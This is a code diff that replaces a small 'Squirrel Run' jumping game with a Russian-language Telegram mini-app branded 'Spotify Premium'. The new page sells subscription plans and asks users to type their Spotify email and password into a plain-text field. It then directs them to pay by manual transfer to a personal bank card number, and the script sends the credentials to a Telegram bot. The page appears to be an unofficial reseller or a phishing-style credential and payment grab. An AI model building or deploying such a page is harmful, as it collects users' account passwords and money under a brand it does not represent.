@@ -1,175 +1,229 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<title>Squirrel Run 🐿</title>
-<style>
-body {
-    margin:0;
-    background:#0f0f0f;
-    color:white;
-    font-family:Arial;
-    overflow:hidden;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Spotify Premium</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            /* Переменные Telegram для автоматической смены темы */
+            --bg: var(--tg-theme-bg-color, #0f0f0f);
+            --sec-bg: var(--tg-theme-secondary-bg-color, #1a1a1a);
+            --text: var(--tg-theme-text-color, #ffffff);
+            --hint: var(--tg-theme-hint-color, #888888);
+            
+            /* Фирменный лаймовый */
+            --accent: #d4ff00; 
+            --accent-soft: rgba(212, 255, 0, 0.1);
+            --error: #ff4d4d;
+        }
 
-#game {
-    width:100%;
-    height:100vh;
-    position:relative;
-}
+        body {
+            margin: 0; padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            -webkit-tap-highlight-color: transparent;
+        }
 
-#ground {
-    position:absolute;
-    bottom:0;
-    width:100%;
-    height:5px;
-    background:#d4ff00;
-}
+        .container {
+            max-width: 500px; margin: 0 auto; padding: 16px;
+            min-height: 100vh; display: flex; flex-direction: column;
+        }
 
-#squirrel {
-    position:absolute;
-    bottom:5px;
-    left:50px;
-    width:50px;
-    height:50px;
-    font-size:40px;
-}
+        .step { display: none; }
+        .step.active { display: flex; flex-direction: column; animation: fadeIn 0.2s ease-out; }
 
-.obstacle {
-    position:absolute;
-    bottom:5px;
-    width:40px;
-    height:40px;
-    background:red;
-    border-radius:5px;
-}
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-#score {
-    position:absolute;
-    top:10px;
-    left:10px;
-    font-size:20px;
-}
+        h2 { font-size: 24px; font-weight: 800; margin: 0 0 8px 0; color: var(--accent); }
+        .desc { color: var(--hint); font-size: 14px; margin-bottom: 24px; }
 
-#start {
-    position:absolute;
-    top:50%;
-    left:50%;
-    transform:translate(-50%,-50%);
-    padding:20px 40px;
-    background:#d4ff00;
-    color:black;
-    font-weight:bold;
-    cursor:pointer;
-}
-</style>
+        /* Карточки тарифов */
+        .plan-list { display: flex; flex-direction: column; gap: 10px; }
+        .card {
+            background: var(--sec-bg);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 18px; padding: 18px;
+            display: flex; justify-content: space-between; align-items: center;
+            cursor: pointer; transition: 0.2s;
+        }
+        .card:active { transform: scale(0.98); background: var(--accent-soft); }
+        .card.popular { border: 2px solid var(--accent); }
+
+        .plan-title { font-weight: 700; font-size: 16px; }
+        .plan-price { font-weight: 800; font-size: 18px; color: var(--accent); }
+
+        /* Инпуты */
+        .input-group { margin-bottom: 16px; }
+        label { font-size: 12px; color: var(--accent); font-weight: bold; margin-left: 4px; text-transform: uppercase; }
+        input {
+            width: 100%; padding: 16px; border-radius: 14px; border: 2px solid transparent;
+            background: var(--sec-bg); color: var(--text); font-size: 16px;
+            outline: none; box-sizing: border-box; margin-top: 6px;
+        }
+        input:focus { border-color: var(--accent); }
+
+        /* Кнопки */
+        .btn {
+            background: var(--accent); color: #000; border: none; width: 100%;
+            padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 800;
+            cursor: pointer; margin-top: auto;
+        }
+        .btn:active { opacity: 0.8; transform: scale(0.98); }
+        .btn-back { background: none; color: var(--hint); margin-top: 10px; font-weight: 500; }
+
+        /* Оплата */
+        .payment-info { background: var(--sec-bg); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
+        .copy-card {
+            background: var(--bg); border: 2px dashed var(--accent);
+            padding: 18px; border-radius: 14px; text-align: center;
+            margin: 15px 0; cursor: pointer; position: relative;
+        }
+        .copy-card code { font-size: 20px; font-weight: 900; letter-spacing: 1px; }
+        .copy-badge { position: absolute; top: -10px; right: 10px; background: var(--accent); color: #000; font-size: 10px; padding: 2px 8px; border-radius: 6px; font-weight: bold; }
+
+        #toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            background: var(--accent); color: #000; padding: 12px 24px;
+            border-radius: 50px; font-weight: bold; opacity: 0; transition: 0.3s; pointer-events: none;
+        }
+
+        .success-screen { text-align: center; padding-top: 50px; }
+        .success-icon { font-size: 60px; color: var(--accent); margin-bottom: 20px; }
+    </style>
 </head>
 <body>
 
-<div id="game">
-    <div id="score">0</div>
-    <div id="start">СТАРТ</div>
-    <div id="squirrel">🐿</div>
-    <div id="ground"></div>
+<div class="container">
+    
+    <div id="step1" class="step active">
+        <h2>Spotify Premium</h2>
+        <p class="desc">Выберите подходящий тарифный план</p>
+        
+        <div class="plan-list">
+            <div class="card popular" onclick="next(2, {k:'ind', d:'1m', p:220, n:'Individual 1 мес'})">
+                <span class="plan-title">Individual ⚡️ (1 мес)</span>
+                <span class="plan-price">220 ₽</span>
+            </div>
+            <div class="card" onclick="next(2, {k:'ind', d:'6m', p:1100, n:'Individual 6 мес'})">
+                <span class="plan-title">Individual (6 мес)</span>
+                <span class="plan-price">1100 ₽</span>
+            </div>
+            <div class="card" onclick="next(2, {k:'ind', d:'12m', p:1800, n:'Individual 1 год'})">
+                <span class="plan-title">Individual (1 год)</span>
+                <span class="plan-price">1800 ₽</span>
+            </div>
+            <div class="card" onclick="next(2, {k:'duo', d:'1m', p:349, n:'Duo (2 аккаунта)'})">
+                <span class="plan-title">Duo 👥 (1 мес)</span>
+                <span class="plan-price">349 ₽</span>
+            </div>
+            <div class="card" onclick="next(2, {k:'fam', d:'1m', p:499, n:'Family (6 чел)'})">
+                <span class="plan-title">Family 🏠 (1 мес)</span>
+                <span class="plan-price">499 ₽</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>Аккаунт</h2>
+        <p class="desc">Введите данные для входа в ваш Spotify</p>
+        
+        <div class="input-group">
+            <label>Email</label>
+            <input type="email" id="email" placeholder="mail@example.com" inputmode="email">
+        </div>
+        <div class="input-group">
+            <label>Пароль</label>
+            <input type="text" id="pass" placeholder="Ваш пароль">
+        </div>
+
+        <button class="btn" onclick="validate()">Продолжить</button>
+        <button class="btn btn-back" onclick="showStep(1)">Назад</button>
+    </div>
+
+    <div id="step3" class="step">
+        <h2>Оплата</h2>
+        <p class="desc">Нажмите на номер карты для копирования</p>
+        
+        <div class="payment-info">
+            <div style="font-size: 14px; opacity: 0.8;">Тариф: <b id="out-plan" style="color:var(--text)">-</b></div>
+            <div style="font-size: 14px; opacity: 0.8; margin-top: 5px;">Сумма: <b id="out-price" style="color:var(--accent); font-size: 18px;">-</b></div>
+        </div>
+
+        <div class="copy-card" onclick="copyCard()">
+            <span class="copy-badge">TAP TO COPY</span>
+            <code id="card-num">2204 3203 8736 6430</code>
+        </div>
+
+        <p style="text-align: center; font-size: 12px; margin-bottom: 20px;">После перевода обязательно отправьте <b>скриншот чека</b> в этот чат.</p>
+        
+        <button class="btn" onclick="send()">Я оплатил(а)</button>
+        <button class="btn btn-back" onclick="showStep(2)">Назад к данным</button>
+    </div>
+
+    <div id="step4" class="step">
+        <div class="success-screen">
+            <div class="success-icon">✅</div>
+            <h2>Заявка отправлена</h2>
+            <p class="desc">Бот ждет ваш скриншот. <br>Активация займет от 5 до 30 минут.</p>
+            <button class="btn" onclick="tg.close()">Закрыть</button>
+        </div>
+    </div>
+
 </div>
 
+<div id="toast">Скопировано!</div>
+
 <script>
-let squirrel = document.getElementById("squirrel");
-let scoreEl = document.getElementById("score");
-let startBtn = document.getElementById("start");
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    tg.setHeaderColor('bg_color');
 
-let jumping = false;
-let score = 0;
-let speed = 6;
-let running = false;
+    let order = {};
 
-function jump(){
-    if(jumping) return;
-    jumping = true;
-
-    let up = setInterval(()=>{
-        let bottom = parseInt(window.getComputedStyle(squirrel).bottom);
-        if(bottom >= 150){
-            clearInterval(up);
-
-            let down = setInterval(()=>{
-                let bottom = parseInt(window.getComputedStyle(squirrel).bottom);
-                if(bottom <= 5){
-                    clearInterval(down);
-                    jumping = false;
-                } else {
-                    squirrel.style.bottom = bottom - 5 + "px";
-                }
-            },20);
-
-        } else {
-            squirrel.style.bottom = bottom + 5 + "px";
-        }
-    },20);
-}
-
-document.addEventListener("keydown", e=>{
-    if(e.code === "Space") jump();
-});
-
-document.addEventListener("touchstart", jump);
-
-function spawnObstacle(){
-    if(!running) return;
-
-    let obs = document.createElement("div");
-    obs.className = "obstacle";
-    obs.style.left = window.innerWidth + "px";
-
-    document.getElementById("game").appendChild(obs);
-
-    let move = setInterval(()=>{
-        let left = parseInt(obs.style.left);
-        obs.style.left = left - speed + "px";
-
-        let sRect = squirrel.getBoundingClientRect();
-        let oRect = obs.getBoundingClientRect();
-
-        if(
-            oRect.left < sRect.right &&
-            oRect.right > sRect.left &&
-            oRect.bottom > sRect.top
-        ){
-            running = false;
-            alert("💀 Ты врезался! Очки: " + score);
-            location.reload();
-        }
-
-        if(left < -50){
-            obs.remove();
-            clearInterval(move);
-        }
-    },20);
-
-    setTimeout(spawnObstacle, 1200 - speed*50);
-}
-
-function gameLoop(){
-    if(!running) return;
-
-    score++;
-    scoreEl.innerText = score;
-
-    if(score % 200 === 0){
-        speed += 1;
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + n).classList.add('active');
     }
 
-    requestAnimationFrame(gameLoop);
-}
+    function next(s, data) {
+        if(data) order = {...order, ...data};
+        showStep(s);
+    }
 
-startBtn.onclick = ()=>{
-    startBtn.style.display = "none";
-    running = true;
-    score = 0;
-    speed = 6;
-    spawnObstacle();
-    gameLoop();
-};
+    function validate() {
+        const e = document.getElementById('email').value.trim();
+        const p = document.getElementById('pass').value.trim();
+        if(!e.includes('@') || p.length < 1) return tg.showAlert('Заполни все поля!');
+        
+        order.email = e; order.password = p;
+        document.getElementById('out-plan').innerText = order.n;
+        document.getElementById('out-price').innerText = order.p + ' ₽';
+        showStep(3);
+    }
+
+    function copyCard() {
+        const c = document.getElementById('card-num').innerText.replace(/\s/g, '');
+        navigator.clipboard.writeText(c);
+        const t = document.getElementById('toast');
+        t.style.opacity = '1';
+        setTimeout(() => t.style.opacity = '0', 2000);
+        if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+    }
+
+    function send() {
+        tg.sendData(JSON.stringify({
+            plan_key: order.k,
+            duration: order.d,
+            price_rub: order.p,
+            plan_name: order.n,
+            email: order.email,
+            password: order.password
+        }));
+        showStep(4);
+    }
 </script>
 
 </body>
